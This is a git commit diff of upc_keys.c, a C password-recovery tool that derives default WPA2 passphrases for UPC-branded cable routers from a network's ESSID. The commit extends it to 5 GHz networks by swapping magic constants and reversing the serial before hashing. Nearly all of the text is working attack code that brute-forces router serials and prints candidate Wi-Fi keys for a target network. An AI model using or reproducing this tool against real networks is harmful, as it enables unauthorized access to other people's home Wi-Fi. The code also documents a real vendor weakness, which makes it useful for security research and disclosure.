7b66c249b1231f80cd7db10000b569be279f7d45
Michal Špaček <mail@michalspacek.cz>
2016-01-10 02:15:45 +0100

    Updated to original version 20160108, which correctly supports 5 GHz networks

--- upc_keys.c
+++ upc_keys.c
@@ -29,10 +29,10 @@
  * Cya,
  * blasty <peter@haxx.in> // 20151231
  *
+ * UPDATE 20160108: I added support for 5GHz networks. Specifying network
+ * type is mandatory now. But as a bonus you get less candidates. :-)
+ *
  * P.S. Reversing eCos and broadcom CFE sux
- * P.P.S. I don't think this is able to recover phrases for 5ghz networks
- * atm but I will look into fixing this soon once I find some time, someone
- * else can feel free to one up me as well. ;-)
  *
  * $ gcc -O2 -o upc_keys upc_keys.c -lcrypto 
  *
@@ -48,8 +48,8 @@
 #include <stdint.h>
 #include <openssl/md5.h>
 
-#define MAGIC_24GHZ 0xffd9da60
-#define MAGIC_5GHZ 0xff8d8f20
+#define MAGIC_24GHZ 0xff8d8f20
+#define MAGIC_5GHZ 0xffd9da60
 #define MAGIC0 0xb21642c9ll
 #define MAGIC1 0x68de3afll
 #define MAGIC2 0x6b5fca6bll
@@ -98,20 +98,50 @@ uint32_t upc_generate_ssid(uint32_t* data, uint32_t magic)
 	return b - (((b * MAGIC2) >> 54) - (b >> 31)) * 10000000;
 }
 
+void banner(void)
+{
+	printf(
+		"\n"
+		" ================================================================\n"
+		"  upc_keys // WPA2 passphrase recovery tool for UPC%%07d devices \n"
+		" ================================================================\n"
+		"  by blasty <peter@haxx.in>\n\n"
+	);
+}
+
 void usage(char *prog)
 {
-	printf("Usage: %s <ESSID>\n", prog);
+	printf("  Usage: %s <ESSID> <band>\n", prog);
+	printf("   - ESSID should be in 'UPCxxxxxxx' format\n");
+	printf("   - band should be either '24' for 2.4GHz or '5' for 5GHz\n\n");
 }
 
 int main(int argc, char *argv[])
 {
 	uint32_t buf[4], target;
 	char serial[64];
+	char serial_input[64];
 	char pass[9], tmpstr[17];
 	uint8_t h1[16], h2[16];
-	uint32_t hv[4], w1, w2, i;
+	uint32_t hv[4], w1, w2, i, cnt=0;
+	int mode = 0;
 
-	if(argc != 2) {
+	banner();
+
+	if(argc != 3) {
+		usage(argv[0]);
+		return 1;
+	}
+
+	if (strlen(argv[1]) != 10 || memcmp(argv[1], "UPC", 3) != 0) {
+		usage(argv[0]);
+		return 1;
+	}
+
+	if (strcmp(argv[2], "24") == 0) mode = 1;
+	else if (strcmp(argv[2], "5") == 0) mode = 2;
+
+	if (mode == 0) {
 		usage(argv[0]);
 		return 1;
 	}
@@ -124,15 +154,27 @@ int main(int argc, char *argv[])
 	for (buf[1] = 0; buf[1] <= MAX1; buf[1]++)
 	for (buf[2] = 0; buf[2] <= MAX2; buf[2]++)
 	for (buf[3] = 0; buf[3] <= MAX3; buf[3]++) {
-		if(upc_generate_ssid(buf, MAGIC_24GHZ) != target &&
-			upc_generate_ssid(buf, MAGIC_5GHZ) != target) {
+		if (mode == 1 && upc_generate_ssid(buf, MAGIC_24GHZ) != target)
 			continue;
-		}
+
+		if (mode == 2 && upc_generate_ssid(buf, MAGIC_5GHZ) != target)
+			continue;
+
+		cnt++;
 
 		sprintf(serial, "SAAP%d%02d%d%04d", buf[0], buf[1], buf[2], buf[3]);
+		memset(serial_input, 0, 64);
+
+		if (mode == 2) {
+			for(i=0; i<strlen(serial); i++) {
+				serial_input[strlen(serial)-1-i] = serial[i];
+			}
+		} else {
+			memcpy(serial_input, serial, strlen(serial));
+		}
 
 		MD5_Init(&ctx);
-		MD5_Update(&ctx, serial, strlen(serial));
+		MD5_Update(&ctx, serial_input, strlen(serial_input));
 		MD5_Final(h1, &ctx);
 
 		for (i = 0; i < 4; i++) {
@@ -154,8 +196,10 @@ int main(int argc, char *argv[])
 		MD5_Final(h2, &ctx);
 
 		hash2pass(h2, pass);
-		printf("%s,%s\n", serial, pass);
+		printf("  -> WPA2 phrase for '%s' = '%s'\n", serial, pass);
 	}
+
+	printf("\n  \x1b[1m=> found %u possible WPA2 phrases, enjoy!\x1b[0m\n\n", cnt);
 
 	return 0;
 }
